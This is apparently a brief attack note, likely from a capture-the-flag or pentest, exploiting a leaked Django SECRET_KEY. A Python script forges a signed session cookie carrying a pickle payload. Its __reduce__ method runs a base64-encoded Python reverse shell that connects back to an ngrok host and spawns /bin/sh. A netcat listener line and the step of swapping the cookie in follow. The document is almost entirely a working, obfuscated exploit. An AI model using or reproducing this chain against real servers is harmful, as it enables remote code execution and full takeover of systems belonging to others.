- Leak SECRET KEY -> Picker Serialize (use Django 4.0.4) -> Reverse Shell
```
import os
import django.core.signing
import pickle
import base64
import django.contrib.sessions.serializers as serializers

SECRET_KEY = 'LEAK-KEY'
salt = 'django.contrib.sessions.backends.signed_cookies'

class Command(object):
    def __reduce__(self):
        return (os.system,("echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgibmdyb2siLHlvdXItbmdyb2stSVApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIiknCg== | base64 -d | sh",))

my_cookie= django.core.signing.dumps(Command(),key=SECRET_KEY,salt= salt, serializer=serializers.PickleSerializer,compress=True)

print(my_cookie)
```
- nc -lnvp [IP]
- Change the cookie to get shell